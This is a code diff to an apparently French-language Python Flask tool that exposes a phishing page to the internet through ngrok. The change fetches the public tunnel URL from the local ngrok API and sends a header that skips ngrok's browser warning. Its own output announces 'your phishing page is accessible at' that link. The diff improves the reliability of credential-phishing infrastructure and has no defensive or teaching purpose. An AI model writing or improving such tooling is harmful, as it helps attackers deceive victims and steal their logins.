@@ -1,6 +1,7 @@
 import os
 import subprocess
 import time
+import requests
 from flask import Flask, request, render_template, redirect
 
 # Codes de couleur ANSI
@@ -51,16 +52,27 @@ def start_ngrok():
         stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
     )
 
-    # Attendre que Ngrok génère le lien
-    time.sleep(5)
-    for line in ngrok_process.stderr:
-        if "ngrok" in line and "http" in line:
-            public_url = line.strip().split()[-1]
+    # Attendre que Ngrok démarre (augmentez le délai si nécessaire)
+    time.sleep(10)
+
+    headers = {
+    "ngrok-skip-browser-warning": "true",  # Ajout de l'en-tête personnalisé
+    "User-Agent": "CustomUserAgent"       # Optionnel : ajout d'un User-Agent personnalisé
+    }
+
+    # Utiliser l'API Ngrok pour récupérer le lien public
+    try:
+        response = requests.get("http://127.0.0.1:4040/api/tunnels",headers=headers, timeout=10)
+        if response.status_code == 200:
+            public_url = response.json()["tunnels"][0]["public_url"]
             print(f"{GREEN}[+] Lien public Ngrok : {CYAN}{public_url}{RESET}")
             return public_url
-
-    print(f"{RED}[!] Impossible d'obtenir le lien public Ngrok.{RESET}")
-    exit(1)
+        else:
+            print(f"{RED}[!] Impossible de se connecter à l'API Ngrok. Code d'état : {response.status_code}{RESET}")
+            exit(1)
+    except requests.exceptions.RequestException as e:
+        print(f"{RED}[!] Erreur lors de la récupération du lien public Ngrok : {e}{RESET}")
+        exit(1)
 
 
 # Démarrer le serveur Flask
@@ -74,11 +86,14 @@ def main():
     # Démarrer Ngrok et obtenir le lien public
     public_url = start_ngrok()
 
-    # Afficher le lien public
-    print(f"{GREEN}[+] Votre page de phishing est accessible à l'adresse : {CYAN}{public_url}{RESET}")
+    if public_url:
+        # Afficher le lien public
+        print(f"{GREEN}[+] Votre page de phishing est accessible à l'adresse : {CYAN}{public_url}{RESET}")
 
-    # Démarrer le serveur Flask
-    start_flask()
+        # Démarrer le serveur Flask
+        start_flask()
+    else:
+        print(f"{RED}[!] Impossible de démarrer Ngrok. Vérifiez votre configuration.{RESET}")
 
 
 if __name__ == "__main__":
